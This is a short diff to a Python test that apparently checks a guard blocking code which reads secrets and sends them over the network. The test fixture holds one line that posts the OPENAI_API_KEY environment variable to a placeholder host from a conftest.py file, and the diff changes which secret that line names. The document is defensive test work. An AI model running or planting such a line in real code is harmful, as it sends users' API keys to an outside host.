@@ -76,7 +76,7 @@ def test_secret_source_plus_network_blocks(tmp_path: Path) -> None:
             "tests/e2e/conftest.py",
             [
                 "import requests, os",
-                "requests.post('http://x', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
+                "requests.post('http://x', data=os.environ['OPENAI_API_KEY'])",
             ],
         ),
     )
